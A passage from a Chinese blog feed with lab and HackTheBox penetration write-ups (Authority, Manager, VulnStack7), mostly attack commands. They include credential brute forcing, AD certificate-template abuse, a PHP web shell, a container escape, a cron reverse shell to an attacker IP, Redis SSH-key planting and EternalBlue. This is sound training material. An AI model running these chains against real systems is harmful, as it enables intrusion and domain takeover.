&quot;svc_pwm&quot;</span><br><span class="line"></span><br><span class="line">&quot;ldap_admin_password&quot;: &quot;DevT3st@123&quot;</span><br></pre></td></tr></table></figure><p>试出三个密码后  我们回想到刚刚的那个8443的https端口处</p><p><img src="../images/image-20231107213359577.png" alt="image-20231107213359577"></p><p>其实在这里的关键就是下面的这两个  将获取到密码输入即可</p><p><img src="../images/image-20231107213753121.png" alt="image-20231107213753121"></p><p>将这里改为我们的地址  然后并且开启监听  然后点击上面的<code>Test LDAP Profile</code>  来使别的服务来连接我们</p><p><img src="../images/image-20231107213957831.png" alt="image-20231107213957831"></p><p>这个就是我们获取到的ldap用户的密码</p><p><img src="../images/image-20231107214559547.png" alt="image-20231107214559547"></p><p><img src="../images/image-20231107214627862.png" alt="image-20231107214627862"></p><p>evil-winrm去登录该用户(5985端口开了)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.222 -u &#x27;svc_ldap&#x27; -p &#x27;lDaP_1n_th3_cle4r!&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107214744554.png" alt="image-20231107214744554"></p><p>尝试提权  步骤应该是先跑sharphound  然后再看whoami /priv  然后再跑certify</p><p>这里的话就不跑sharphound了  域内就一个用户  </p><p><img src="../images/image-20231107215028183.png" alt="image-20231107215028183"></p><p>这里话由于是公共靶机  所以才导致这种情况的出现  实际上的话没有可利用权限的</p><p>所以这里就尝试跑这个Certify来看看有没有证书模板漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad find -u &#x27;svc_ldap@authority.htb&#x27;  -password &#x27;lDaP_1n_th3_cle4r!&#x27; -dc-ip 10.10.11.222 -vulnerable -stdout</span><br></pre></td></tr></table></figure><p>这里的话就两个关键点</p><p><img src="../images/image-20231107215453299.png" alt="image-20231107215453299"></p><p><img src="../images/image-20231107215359288.png" alt="image-20231107215359288"></p><p>这里其实扫出来了这个ESC1 但是直接去搜文章的话是打不了的  这里的话还是用这个CVE-2022–26923这个来打</p><p><a href="https://forum.butian.net/share/1578">https://forum.butian.net/share/1578</a>    这篇文章很详细的分析了这个漏洞</p><p>先是创建个机器账户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addcomputer.py authority.htb/svc_ldap:&#x27;lDaP_1n_th3_cle4r!&#x27; -computer-name COMPUTER$ -computer-pass &#x27;COMPUTER&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107215834297.png" alt="image-20231107215834297"></p><p>成功添加这个机器账户  说明上面的CVE能打</p><p>然后接着去申请这个CornVPN模板证书</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad req -username COMPUTER$ -password &#x27;COMPUTER&#x27; -ca AUTHORITY-CA -target authority.htb -template CorpVPN  -upn administrator@authority.htb -debug</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107220001639.png" alt="image-20231107220001639"></p><p>申请成功 然后直接auth认证就行了</p><p><img src="../images/image-20231107220041342.png" alt="image-20231107220041342"></p><p>不出意外的话出意外了  </p><p><img src="../images/image-20231107220114097.png" alt="image-20231107220114097"></p><p>打网鼎半决赛靶机的时候遇到过这个问题  那么我们就换Schannel协议来打</p><p>先将.pfx文件转化为.key和.crt文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad cert -pfx administrator.pfx -nokey -out user.crt</span><br><span class="line">certipy-ad cert -pfx administrator.pfx -nocert -out user.key</span><br></pre></td></tr></table></figure><p>然后使用passthecert.py工具来测试是否成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 passthecert.py -action whoami -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107220453143.png" alt="image-20231107220453143"></p><p>是admin权限  那么我们就直接上ldap_shell</p><p><img src="../images/image-20231107220802525.png" alt="image-20231107220802525"></p><p>这里之前加过了  所以不能再加了  然后直接再用evil-winrm连接上去就行了</p><p><img src="../images/image-20231107220913700.png" alt="image-20231107220913700"></p><p>拿下</p><p>总结一下  其实最后打域控这里的话没啥奇怪的东西  就是打一个简单的CVE 然后前面的ansible来获取账号密码</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;还是先扫一下  这里是推荐fscan和nmap同时扫  这样获取到的信息能多点&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231107210225491.png&quot; alt=&quot;image-20231107210225491&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;im</summary>
      
    
    
    
    
    <category term="HTB" scheme="https://ke1nys.github.io/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Manager</title>
    <link href="https://ke1nys.github.io/posts/8d11f029.html"/>
    <id>https://ke1nys.github.io/posts/8d11f029.html</id>
    <published>2023-11-06T11:04:30.000Z</published>
    <updated>2023-11-07T14:23:59.803Z</updated>
    
    <content type="html"><![CDATA[<p>域渗透</p><p>先fscan扫一下</p><p><img src="../images/image-20231106191309453.png" alt="image-20231106191309453"></p><p>信息整理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.236   80 88 1433 445 139 smb dc01 5985 winrm端口  manager.htb </span><br></pre></td></tr></table></figure><p>这里这个manager.htb的话fscan没扫出来  这里用nmap来扫</p><p><img src="../images/image-20231106192528047.png" alt="image-20231106192528047"></p><p>记得把这个域名加到hosts里  不然等会打的时候会失败</p><p>先去访问这个80端口</p><p>发现是个纯静态的网页  没办法入手 于是尝试进行cme来获取域内的用户 来爆破其密码</p><p><img src="../images/image-20231106192818921.png" alt="image-20231106192818921"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb manager.htb -u anonymous -p &quot;&quot; --rid-brute 100004</span><br><span class="line"></span><br><span class="line">//匿名爆破RID  来爆破出域内的用户</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106193106672.png" alt="image-20231106193106672"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SMB         manager.htb     445    DC01             1113: MANAGER\Zhong (SidTypeUser)</span><br><span class="line">SMB         manager.htb     445    DC01             1114: MANAGER\Cheng (SidTypeUser)</span><br><span class="line">SMB         manager.htb     445    DC01             1115: MANAGER\Ryan (SidTypeUser)</span><br><span class="line">SMB         manager.htb     445    DC01             1116: MANAGER\Raven (SidTypeUser)</span><br><span class="line">SMB         manager.htb     445    DC01             1117: MANAGER\JinWoo (SidTypeUser)</span><br><span class="line">SMB         manager.htb     445    DC01             1118: MANAGER\ChinHae (SidTypeUser)</span><br><span class="line">SMB         manager.htb     445    DC01             1119: MANAGER\Operator (SidTypeUser)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106193627271.png" alt="image-20231106193627271"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的用户名和密码要小写来记录  </span><br></pre></td></tr></table></figure><p>然后使用cme来进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb manager.htb -u user.txt  -p user.txt</span><br></pre></td></tr></table></figure><p>最好爆破出密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb manager.htb -u user  -p user</span><br><span class="line"></span><br><span class="line">SMB         manager.htb     445    DC01             [+] manager.htb\operator:operator </span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106194120494.png" alt="image-20231106194120494"></p><p>在尝试直接用这个账号密码来登录这个服务器主机的时候  失败了 我们回想到刚开始时的收集到地1这个mssql  直接使用impacket来连接  这里使用MUDT来连接也是可以的  但是这里的话因为这个没用物理机连vpn就不试了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient manager.htb/operator:operator@manager.htb -dc-ip 10.10.11.236 -windows-auth</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106194152670.png" alt="image-20231106194152670"></p><p>发现命令执行不了  猜测不是sa权限  然后尝试看看能不能读取文件</p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server?source=post_page-----9d4e32d363e4--------------------------------#manual-enumeration">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server?source=post_page-----9d4e32d363e4--------------------------------#manual-enumeration</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_dirtree &#x27;C:\&#x27;, 1, 1;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106194301482.png" alt="image-20231106194301482"></p><p>发现是可读的  所以挨个尝试  发现了  网站目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_dirtree &#x27;C:\inetpub\wwwroot&#x27;, 1, 1;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106194347090.png" alt="image-20231106194347090"></p><p>访问这个路径并把文件下载下来  并且访问</p><p> <img src="../images/image-20231106195033622.png" alt="image-20231106195033622"></p><p>发现里面有一个域用户的账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raven    raven@manager.htb</span><br></pre></td></tr></table></figure><p>开了winrm服务的端口 </p><p>使用evil-winrm来进行连接  这里就能尝试成功了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.236 -u raven -p &#x27;R4v3nBe5tD3veloP3r!123&#x27;</span><br></pre></td></tr></table></figure><p>然后就能拿到flag</p><p><img src="../images/image-20231106201535113.png" alt="image-20231106201535113"></p><p>接下来这里的话我是直接跑那个sharphound</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm的话是可以使用upload来上传文件的</span><br><span class="line"></span><br><span class="line">upload /root/SharpHound.exe ./</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Invoke-WebRequest -Uri &quot;http://10.10.16.14:8000/Certify.exe&quot; -OutFile &quot;Certify.exe&quot;</span><br><span class="line">将sharpblood上传上去  (这个其实也可以上传)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SharpHound.exe --CollectionMethods All --Domain xiaorang.lab --ExcludeDCs</span><br></pre></td></tr></table></figure><p>挑了一下那两个用户来看  没发现啥有用的信息</p><p>然后跑一下certify 看看有没有证书漏洞可用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad find -u &#x27;raven@manager.htb&#x27;  -password &#x27;R4v3nBe5tD3veloP3r!123&#x27; -dc-ip 10.10.11.236 -vulnerable -stdout</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106201552946.png" alt="image-20231106201552946"></p><p>然后直接去找这个模板的ESC7的POC来打就行了</p><p><a href="https://xz.aliyun.com/t/12267#toc-8">https://xz.aliyun.com/t/12267#toc-8</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad ca -ca &#x27;manager-DC01-CA&#x27; -add-officer raven -username &#x27;raven@manager.htb&#x27; -password &#x27;R4v3nBe5tD3veloP3r!123&#x27; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certipy-ad ca -ca &#x27;manager-DC01-CA&#x27; -enable-template SubCA -username &#x27;raven@manager.htb&#x27; -password &#x27;R4v3nBe5tD3veloP3r!123&#x27; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certipy-ad req -username &#x27;raven@manager.htb&#x27; -password &#x27;R4v3nBe5tD3veloP3r!123&#x27; -ca &#x27;manager-DC01-CA&#x27; -target manager.htb -template SubCA -upn &#x27;administrator@manager.htb&#x27; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certipy-ad ca -ca &#x27;manager-DC01-CA&#x27; -issue-request 13 -username &#x27;raven@manager.htb&#x27; -password &#x27;R4v3nBe5tD3veloP3r!123&#x27; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certipy-ad req -username &#x27;raven@manager.htb&#x27; -password &#x27;R4v3nBe5tD3veloP3r!123&#x27; -ca &#x27;manager-DC01-CA&#x27; -target manager.htb -retrieve 13</span><br><span class="line"></span><br><span class="line">//这里的13是会输出出来的  根据自己生成的来进行替换</span><br></pre></td></tr></table></figure><p>然后直接拿获取到的证书来进行身份验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad auth -pfx administrator.pfx  -dc-ip 10.10.11.236</span><br></pre></td></tr></table></figure><p>这里会报错  因为时间不同  我们是东八区  用的vpn是欧洲的  时差7个小时 所以报错</p><p><img src="../images/image-20231106202018558.png" alt="image-20231106202018558"></p><p>使用faketime来操作就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime -f +7h certipy-ad auth -pfx ./administrator.pfx -dc-ip 10.10.11.236</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106201957024.png" alt="image-20231106201957024"></p><p>然后拿着hash值去打evil-winrm就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.236 -u Administrator -H &quot;ae5064c2f62317332c88629e025924ef&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106202123442.png" alt="image-20231106202123442"></p><p>————— 总结</p><p>这里其实学习到的一点就是这个用cme来爆破RID来获取到域内的用户</p><p>然后mssql连上去的话不能使用xp_cmdshell来执行命令  只能用<code>EXEC xp_dirtree &#39;C:\inetpub\wwwroot&#39;, 1, 1;</code>来读取文件内容</p><p>然后就是最后的话就是用证书模板漏洞来打了  这个还行</p><p>ESC7</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;域渗透&lt;/p&gt;
&lt;p&gt;先fscan扫一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231106191309453.png&quot; alt=&quot;image-20231106191309453&quot;&gt;&lt;/p&gt;
&lt;p&gt;信息整理一下&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    
    <category term="HTB" scheme="https://ke1nys.github.io/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>VulnStack7</title>
    <link href="https://ke1nys.github.io/posts/c08e5485.html"/>
    <id>https://ke1nys.github.io/posts/c08e5485.html</id>
    <published>2023-11-03T03:25:26.000Z</published>
    <updated>2023-11-07T14:23:59.804Z</updated>
    
    <content type="html"><![CDATA[<p>打之前把防火墙全关了  不然容易打一些步骤的时候会报错</p><p>这个靶机没云镜的好玩  域渗透的过程过于简单了  MS17梭哈全场</p><p>(实际上说是两层代理  其实就一层代理  52是可以出网的  只有93是内网)</p><p>防火墙记得关一下就行了</p><p><a href="https://www.freebuf.com/articles/network/264560.html">https://www.freebuf.com/articles/network/264560.html</a></p><p><a href="https://xz.aliyun.com/t/9574#toc-5">https://xz.aliyun.com/t/9574#toc-5</a></p><p>上面有搭建环境的步骤  就不写了这里</p><p>fscan扫一下这个ip <code>10.6.221.204</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/VulnStack]</span><br><span class="line">└─# ./fscan_amd64 -h 10.6.221.204 -p 1-10000   </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.6.221.204    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">10.6.221.204:80 open</span><br><span class="line">10.6.221.204:22 open</span><br><span class="line">10.6.221.204:81 open</span><br><span class="line">10.6.221.204:6379 open</span><br><span class="line">[*] alive ports len is: 4</span><br><span class="line">start vulscan</span><br><span class="line">[+] Redis:10.6.221.204:6379 unauthorized file:/home/web/dump.rdb</span><br><span class="line">[+] Redis:10.6.221.204:6379 like can write /root/.ssh/</span><br><span class="line">[+] Redis:10.6.221.204:6379 like can write /var/spool/cron/</span><br><span class="line">[*] WebTitle: http://10.6.221.204:81    code:200 len:17474  title:Laravel</span><br><span class="line">[+] InfoScan:http://10.6.221.204:81    [Laravel] </span><br><span class="line">[+] http://10.6.221.204:81 poc-yaml-laravel-cve-2021-3129</span><br></pre></td></tr></table></figure><p>通过看这个fscan的结果可知  存在一个redis未授权和一个laravel的CVE</p><blockquote><p>80  81  22  6379</p></blockquote><p>直接打就行了 </p><p>这里先打这个laravel的CVE</p><p><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP/tree/main">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP/tree/main</a>  </p><p>直接用这个poc脚本来打就行了</p><p><img src="../images/image-20231103210805760.png" alt="image-20231103210805760"></p><p>记得用低于3版本的哥斯拉来连接  不然会报错连不上</p><p><img src="../images/image-20231103211201823.png" alt="image-20231103211201823"></p><p>这里我不习惯用哥斯拉  直接给当前网站写马连蚁剑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot; &gt; 1.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231103211407028.png" alt="image-20231103211407028"></p><p>然后开始收集信息</p><p><img src="../images/image-20231103211424417.png" alt="image-20231103211424417"></p><p>发现ip啥的看不了  直接上cdk</p><p>wget或者从本地上传上去都是可行的方案</p><p><img src="../images/image-20231103211549491.png" alt="image-20231103211549491"></p><p>发现这个ip不太对劲  我们访问的是<code>http://10.6.221.204:81/</code>进来的   结果看到这个ip是172的</p><p><img src="../images/image-20231103211659113.png" alt="image-20231103211659113"></p><p>证实了我们的想法  是docker的 </p><p>于是开始尝试提权 </p><p><img src="../images/image-20231103211750091.png" alt="image-20231103211750091"></p><p>这个东西太显眼了  在用户下的一个命令</p><p><img src="../images/image-20231103211825267.png" alt="image-20231103211825267"></p><p>发现其会执行ps命令 那么我们如果加一个ps命令  并且修改PATH 然后让其优先于原来的ps  然后这样就可以进行提权了</p><p>先弹个shell到攻击机上 (蚁剑不太好操作提权)</p><p><img src="../images/image-20231103212504380.png" alt="image-20231103212504380"></p><p><img src="../images/image-20231103212512500.png" alt="image-20231103212512500"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH </span><br><span class="line">export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</span><br><span class="line">cd /home/jobs</span><br><span class="line">./shell</span><br><span class="line"># 然后就获得了root权限，可以执行命令了</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231103212820263.png" alt="image-20231103212820263"></p><p>拿下root权限后 我们尝试docker逃逸  这里用的是这个<strong>磁盘挂载逃逸(也是特权模式逃逸)</strong></p><p>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。</p><p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</p><p>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p><p>首先我们现在docker中新建一个/hack目录用来挂在文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /hack</span><br><span class="line">mount /dev/sda1 /hack</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231103212958092.png" alt="image-20231103212958092"></p><p>挂载成功 那么接下来我们就写定时任务反弹shell了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/10.6.209.175/1235 0&gt;&amp;1&#x27; &gt;&gt; /hack/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231103214048489.png" alt="image-20231103214048489"></p><p><img src="../images/image-20231103214118466.png" alt="image-20231103214118466"></p><p>但是收不到shell 直接手动弹过来</p><p><img src="../images/image-20231103214229261.png" alt="image-20231103214229261"></p><p><img src="../images/image-20231103214247931.png" alt="image-20231103214247931"></p><p>这里又有一个很有意思的点出现了  我们拿到docker的宿主机  但是发现其ip并不是我们所访问的ip  <code>10.6.221.204</code></p><p>这里可以猜测是开了nginx反向代理了   (先别慌  很有个redis主机还没拿下)</p><p>接下来就是打这个redis主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa #生成公钥</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt #将公钥导入foo.txt文件</span><br><span class="line">cat foo.txt | redis-cli -h 10.6.221.204 -p 6379 -x set hello #把foo.txt文件内容写入目标主机的redis缓冲中</span><br><span class="line">config set dir /root/.ssh    # 设置redis的备份路径为/root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys    # 设置保存文件名为authorized_keys</span><br><span class="line">save    # 将数据保存在目标服务器硬盘上</span><br><span class="line">ssh 10.6.221.204 # 连接</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231103214807152.png" alt="image-20231103214807152"></p><p>成功连上 <img src="../images/image-20231103214824015.png" alt="image-20231103214824015"></p><p>这就是我们所访问的这个外网ip了</p><p>然后去查看其nginx配置文件</p><p><img src="../images/image-20231103220039114.png" alt="image-20231103220039114"></p><p>确实和我们想的一样  做了nginx反向代理   所以我们访问<code>10.6.221.204:81</code>端口时  访问的却是<code>http://192.168.52.20:8000</code></p><p>docker也是在这个上面的启动的</p><p>那么整理一下</p><p><img src="../images/image-20231103220420776.png" alt="image-20231103220420776"></p><p>虽然说是第二层网络  但是这个192.168.52.20是出网的  我们直接可以拿来当第一层来打</p><p>然后直接先上传fscan上去扫一下93这个c段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(icmp) Target 192.168.93.20   is alive</span><br><span class="line">(icmp) Target 192.168.93.40   is alive</span><br><span class="line">(icmp) Target 192.168.93.10   is alive</span><br><span class="line">(icmp) Target 192.168.93.30   is alive</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231103220921129.png" alt="image-20231103220921129"></p><p>这里的话是一共有4个主机在域内</p><p>但是你这么一看的话 域控和另一台主机是MS17  那么直接打就行了</p><p>信息整理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.93.20   PC1.whoamianony.org</span><br><span class="line"></span><br><span class="line">192.168.93.40   PC2.whoamianony.org</span><br><span class="line"></span><br><span class="line">192.168.93.30   [+]DC DC.whoamianony.org</span><br></pre></td></tr></table></figure><p>挂代理然后开打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid  //这个是个关键了 可以配合proxychains4本地使用</span><br><span class="line">set RHOSTS 192.168.93.20</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>然后拿下PC1  之后   是system权限  然后creds_all拿下域控账号密码</p><p>然后psexec直接上域控就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains wmiexec.py whoamianony.org/Administrator:&#x27;Whoami2021&#x27;@DC.whoamianony.org -dc-ip 192.168.93.30</span><br></pre></td></tr></table></figure><p>然后就结束了………………………..</p><p>这个域环境太简单了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打之前把防火墙全关了  不然容易打一些步骤的时候会报错&lt;/p&gt;
&lt;p&gt;这个靶机没云镜的好玩  域渗透的过程过于简单了  MS17梭哈全场&lt;/p&gt;
&lt;p&gt;(实际上说是两层代理  其实就一层代理  52是可以出网的  只有93是内网)&lt;/p&gt;
&lt;p&gt;防火墙记得关一下就行了&lt;/p</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>ACTF2023-Web</title>
    <link href="https://ke1nys.github.io/posts/c2eb5b43.html"/>
    <id>https://ke1nys.github.io/posts/c2eb5b43.html</id>
    <published>2023-10-31T01:37:37.000Z</published>
    <updated>2023-11-07T14:23:59.799Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://su-team.cn/passages/2023-10-28-ACTF/">https://su-team.cn/passages/2023-10-28-ACTF/</a></p><p><a href="https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c">https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzk0NjM5OTc1NQ==&amp;mid=2247483873&amp;idx=1&amp;sn=3b771293296edae5cf913c2bc85ba1a8&amp;chksm=c307fe85f4707793149c2aeebe76c086e375f9f666c143b68556e5fa358fa62694533cc630e8&amp;mpshare=1&amp;scene=23&amp;srcid=10317I620Rz9DLyGPvjH4heX&amp;sharer_shareinfo=fa0d322996aa33d12e0962e62f42eb67&amp;sharer_shareinfo_first=fa0d322996aa33d12e0962e62f42eb67#rd">https://mp.weixin.qq.com/s?__biz=Mzk0NjM5OTc1NQ==&amp;mid=2247483873&amp;idx=1&amp;sn=3b771293296edae5cf913c2bc85ba1a8&amp;chksm=c307fe85f4707793149c2aeebe76c086e375f9f666c143b68556e5fa358fa62694533cc630e8&amp;mpshare=1&amp;scene=23&amp;srcid=10317I620Rz9DLyGPvjH4heX&amp;sharer_shareinfo=fa0d322996aa33d12e0962e62f42eb67&amp;sharer_shareinfo_first=fa0d322996aa33d12e0962e62f42eb67#rd</a></p><h2 id="craftcms"><a href="#craftcms" class="headerlink" title="craftcms"></a>craftcms</h2><p>题目关了  就讲讲思路就行了</p><p>这题直接搜就出来poc了</p><p><a 